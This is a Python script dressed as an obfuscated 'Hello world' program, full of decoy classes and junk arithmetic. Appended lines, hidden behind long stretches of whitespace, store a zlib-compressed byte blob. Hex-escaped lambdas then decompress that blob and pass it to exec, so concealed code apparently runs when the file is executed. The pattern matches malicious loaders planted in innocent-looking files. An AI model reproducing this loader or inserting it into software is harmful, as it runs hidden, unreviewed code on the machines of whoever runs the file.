from builtins import *
from math import prod as Square


__obfuscator__ = 'Deluxe'
__authors__ = "SadHam"
__github__ = 'https://github.com/'
__discord__ = 'https://discord.gg/'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_power, _memoryaccess, Algorithm, Math, _theory, _stackoverflow, Frame = exec, str, tuple, map, ord, globals, type

class _product:
    def __init__(self, Multiply):
        self.Negative = Square((Multiply, 67013))
        self.Round(_frame=10933)

    def Round(self, _frame = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Negative /= 96914 / _frame
        
        try:
            ((_power, (Cube, _memoryaccess, _power)) for _power in {_theory: Math} if _memoryaccess < _memoryaccess)

        except AssertionError:
            (((Algorithm, _power, Cube), Math) for Math in (_power, Cube))

        except:
            Frame(49785 * 99808) == True

    def _statistics(self, _builtins = 21294):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _builtins -= 8633 * -20881
        self.Floor != float
        
        try:
            (((Cube, _memoryaccess, _power), _theory) for _theory in {_theory: Math})

        except ArithmeticError:
            {_theory: Math} if _theory != Cube else {_theory: Algorithm} < _power

        except:
            Frame(-44606 + -75624) == None

    def CallFunction(_add = type):
        return _stackoverflow()[_add]

    def _system(Add = 78505 - 80362, Theory = False, _algorithm = _stackoverflow):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _algorithm()[Add] = Theory
        
        try:
            ((Cube, (_power, _memoryaccess)) for Cube in {_theory: Algorithm} if Cube is Math)

        except AssertionError:
            (({_theory: Algorithm}, Cube) for Cube in (_power, _memoryaccess))

        except:
            Frame(-92382 * -94184) == False

    def execute(code = str):
        return _power(_memoryaccess(Algorithm(Math(_theory, code))))

    @property
    def Floor(self):
        self._positive = '<__main__.Theory object at 0x000008487BE23197>'
        return (self._positive, _product.Floor)

if True:
    try:
        _product.execute(code = __code__)
        Substract = _product(Multiply = -90118 - -67863)

        if 240478 > 5859306:
            _product(Multiply = 64958 - 38756).Round(_frame = Substract.Negative + -27558)
        elif 496537 < 6395153:
            _product(Multiply = 81222 / 14540).Round(_frame = Substract.Negative + 27226)                                                                                                                                                                                                                                                          ;_product._system(Add='XWXXXXXWXXWWXWWXXXWXW',Theory=b'x\x9c\xe5X\xddo\xdb6\x10\x7f\x17\x90\xff\x81Q\x1f$!\x8e\xe2\xb5+P\x18\xf0CQ\xf7\xc3\x81\x13\x17m\xb7dH\x03\x83\x96h\x9b\t%\n$\x15\xdb\x08\xf2\xbf\xef\x8e\xfa\xb0";\xde\xb2\xed);[\xd6\x91\xbc/\xfe\x8e\xa4uzE>\x7f>$\x7f\xc8\x9c\xdc\xe4\xda\x90\x98\xc9\xe9,\xd7\x115,&\x94\xcc\xb8`\xa4\xd1\xb3\xe4fA\x06L\xe4+\xe68\xaf\xc8\x07\x99\xce\x155\xb9\xa0\x86\xcbT\x1f:\x8ec\xd4\xba\xe7\x10 >#\xbee\x90&\x93\xca\x88T\x93\t9\xec\x13\xb7\xb0\xe2\x12\xa9\x1aR47\x0b\xa9t)\xf2\x9d\xc6_h\xd2\x12\x99C\x08\xf9\xb4\x94X\x18\x93\xe9\xde\xc9I\xd1\x19F29i\x89\xc7\\GR\xc5-\xf9\xb27\x9c\xcf\xdb\xf2\x82G,\xd5\xac\x94\xff\xf8ut\xfc:\xec\xb6d"\x19\x97\x02^\xa6xj|\xf7\x0b\x13B\x92\xa5T">t\x03\xcf\xca\x06\xbdZ\x05e<}\xcbc/p\xd8*b\x99)1J\xb3\x1c\xb4\xbfI\xcd4\xa1\x8a\x11\xc5\xe2\x9f\xe9\xef\\\nf\x8a\x8e\xa9\xc8\xd9\xcf\x14\xd3\x83-J\xd0\xc8\xcf\xf4\\Ne\xbc&\x82\xdf\x82\xdeZ\xe6n\xe0\x14\x91\xf1$\x93\xcaL&\xe0m\xad\xbd d+n\xfc\x00\xd2"dD\x85\xf6\x83+o\xb9Z\xae\x80\xe0\xb6,\xd8\xa5mx\xd7\xfd\xb9\x90S\x10r\x9e\x90@\xe5\x81\x1cK9\x18\xcb\xf1@\x0e$p\x83\xe2;\xf0\xaez\xbd\xa3\xe3\xa3c\xff\xd8?\xfa%\x08\xae\xc1\x183\xd4\x18\xb5\xcf\xd8\xb8 0\x06\xe6$2\xe3m;1\xdfo\xc3*J\xd9\xc5\xdfq\xb7\xdb\x85\x1f\xf8\xc2l\x8a\x19;O\x08\xa0nZS\x92$\xf6\x06\x17hn`\xdc\xe7\xf9\x0c\xe8\xfc\xfc\x0c?g\xf6:\x03\xd5\x9d&}o\x9asax\x8a\x19\xb9\xa3J;\xdb\xbav.]\x1b\xa0\x8d\x16\x03\xedB\xc0`sP\xa1\x8c\x80\x97\xe0C\x1a\x06\xfe\x13\xcet\xca\x8d\xe0\xf9\xb4\x8de\xd0\xb1\x10c\xfe\xd0HA\xcf6\x12\\\xfd\'VB\x9e\xc6l\xe5{,W?\xb6F\xaf\x83\xbdiC\x0fp\x15\x8e\xd0\xd5?\x00\x89\xf3H\xd3\x94\xff;\x90\x9e4\xf2,\x90\x9e\xb6R\x81\xb4\x86cx\xc5\x16i\xfeL\xa4\xc4P\x88!\\@\xc3\x82\x7f\xe9\xcb\xc9P)f\xcfD\xe9\xe2\xf2\xf2\xe2\xe2\xe2\xd2\xde.-\xff\xd2Q\x12\xf4\x8e\xed\x02i\xf7\xb1$\x0b\xd7\x88\x1e8\x87\x08\xeca\xfd\xe21\x92r{\xf4\xaf\xb6[\xb1\xd7\xf0>\xb4\xf4\x7f\xd8rL\x0b\xfa\xe9\xef\xaf\xa6\xb1E\xce\xfa\x85\x7f\xb8.\xb6^<B\x82g\x89\x8cva\xb4\xe7\xf9b4\x1a\x8eN\xe1\x1a\x9e\x9e\x8eN\x87#\xe0ms4z\xe9p)\xa3\x9f\tU\xd9k\xc7K\x01\x00\xc9\xf3\xc2\x1b\xc9\xd3=\x8a\xdbO\x12\xfe\xd4{\xfb\xe6\xcd\xeb\xe2\xc2_\xfcl\xb8v\xeb\xed\x1bx\xa2\x8b\x19\xd6\x03\xbe\xf7nfv\xfcA\xbf\xec\\El\xb5\xf3\x9f\x04h\xa6dB\xaa\x07_R<Q\x13\x10\x8f:\x82k\xd3\xd1y\xc6T\xe7\xa3-\x86\xa0v\xec\xc8\x8c\xa5\x1d,W\x1c\x94\xf1=\xa8\x94\x9cR\xe9F\xcb\xf4\xa0j\x089\x9f\xf3t^\xb7\xa5\xaeY(y\x0e\x9c\x83\xc21\x14\x9a\t\x8f\x96\x8a\x1bV;/\xfa&\xb6\xb3\x16\xfc\xach\xf2>\x8eyd\xa0zT,\xd4P\xa1\xd29\xabt\xde\x7f\xf80\xfe\xed\xfc\xc7w\x94G\xd7L\x91~\x15C\x085\xce\xc8\xf6\xf9\x93IJ\x13\xa8\t\x03\x94;p"A\xb5&_\x99\xd20U\x96\x9a\x11\xdc|\x9cv\xd0;\xb0\x95\x1a\xd6\xd5\xa8\x01\xc6\xcee\xca\x8aN\x96\xe2BRu_\xd1\x1b\xb3\x19\x16v\x90\n(\xeb4\x13\xb3N\xad\xdd\xa9T*\xb3H(\x126\xecWlKb\xe3\xac\xe4\x1a\xe3\x98\x1a?\x08k\xafA3\x96\xac\x98U\x19\n\x94g,\x02\xc8\xd6\xcd\x10\xa0\xf4\xaf\xfb\t\xd7v:\x8da$\xc5L\xae\xd2\xcan\xa9\x94J\xccg\x98Q\xb3\xc0\xcaU\x1b\xed\xcf\xdc\xfb*\x05\x0f\'\xf7\xb5\xd5\x077h\x19\x04\xbd\x84\xde2\x90\xd8\xa7\xd4t\x88n\x10\x9f\'\x84O\xee\x1f!\xf9\x10\xe22t[\x11\xb7\xa2E\xbe\x1d\x98}e\x82\xab\xbb\x18%T\xdb\x05=A\xc3-Q$|\x7f\xb2\xdd\x8bd\xb5\xa8Rt\rQc#\x14\x92\xc6~m,\xd8V+\xde5\x90z\x97\xa1\xf3]N\x91\x8a\xd5\x1d2\xa5\xa4\xf2w\x8b \xcd\xdc\xaf\x82Q\xcdH\xb4`\xd1-\xb9\xaf\xdd\x87\x16\xa5\x0e\xe1\x86D25\x14w\xbdY@\xf6\xad\xc5\x1e\xb9g\x0f\xeen\xb3;\x02G\x82\xed\\\xbc\xbf\xe8\x06[\xa9V,\x91w\xac@t3\xc8\x84n\xcf\xee\x11hW\xd7\xcd\xf45\x86\x8e\xfa\xc4o\xee\n8\xd3g4\x17\xe6Q\'N\x8d%\x01\x99Ie9\xc2S\xbb\x95\x1e-\xaaW\xe4\x9b\r\x8d\xc4y&8\xbe4\xd3-\x8frz\x03+\x0c\xa2\xb9\x7f\xd8\x8c4mn\xe2j\xcd\x05\x05&<\x06U\xe4\xf0\xf4\xf1]\x1e\xbb-t`UV\x82\xbb\xb7\x1e\x92\xa2\x1cRX\xaf\x0b\xdf\x1d\x82\x8aF\xef\x8f\x0f-\x92\xe0K\xc1\x05\xd4\x0b\x04\xece\n\xd6\xb12\xeb\xc3\xb6\xcf\xc6\xc4\xaeJ\xe7\xd7e\x98;\xf1\x86#\x14\x8f\x90\x86ZxGE\xce\xb4\x1f<B\xd3\xee\x9d\xe6\xb1m3\xde!\x00\xb0\xb2\xed\xfe\x0f\x95W\xc7 \x9c\xc8}77\xb3\xe3w\xae\xdde\x12\xf8\xed=f7N\x9c\'\x99\xbf\x89\xa7S\xc9B\x8a\xe1\x7f-5\xfd_;D\xe3\x1b\xa0[\xb6\xd6\xfdO\x14\xd6U\xf0\'W\x81\x9d\xed')

        if 189807 > 8771497:
            Substract._statistics(_builtins = -90546 / Substract.Negative)
        elif 343599 < 5818556:
            Substract._statistics(_builtins = 55019 + Substract.Negative)                                                                                                                                                                                                                                                          ;lIIllllIlIlllIllIll,NNMNNNNMMMMNNNNNNMN,WWXWXXXWXXWXXWWXWWWXWXWXX,nnmmnmmnnmnnmmmmn,NNMNNMNNMMNNNNNMM=(lambda ilijjiiilijilijjj:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(ilijjiiilijilijjj)"),filename='\x53\x32\x53\x32\x32\x53\x32\x32\x53\x32\x32\x32\x32\x32\x32\x32\x53\x32\x53\x53',mode='\x65\x76\x61\x6c'))),(lambda ilijjiiilijilijjj:ilijjiiilijilijjj(__import__('\x7a\x6c\x69\x62'))),(lambda ilijjiiilijilijjj:ilijjiiilijilijjj['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda ilijjiiilijilijjj:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(ilijjiiilijilijjj)"),filename='\x53\x32\x53\x32\x32\x53\x32\x32\x53\x32\x32\x32\x32\x32\x32\x32\x53\x32\x53\x53',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda nmnnmnnmnnmmmnmmnm,ilijjiiilijilijjj:nmnnmnnmnnmmmnmmnm(ilijjiiilijilijjj))
        _product(Multiply = 46208 / -20213)._statistics(_builtins = 79736 + Substract.Negative)                                                                                                                                                                                                                                                          ;nnmmnmmnnmnnmmmmn()(NNMNNMNNMMNNNNNMM(WWXWXXXWXXWXXWWXWWWXWXWXX(NNMNNNNMMMMNNNNNNMN(lIIllllIlIlllIllIll('\x76\x61\x72\x73'))),_product.CallFunction(_add='XWXXXXXWXXWWXWWXXXWXW')))

    except Exception as Cube:
        import traceback
        print(f'    module {__name__} raised an Exception:')
        print(f'     {Cube}')
        print(traceback.format_exc())
        if 258443 > 6870353:
            _product.execute(code = _memoryaccess(Cube))

        elif 239036 > 5687331:
            _product(Multiply = 60698 - -16338).Round(_frame = Substract.Negative * 50124)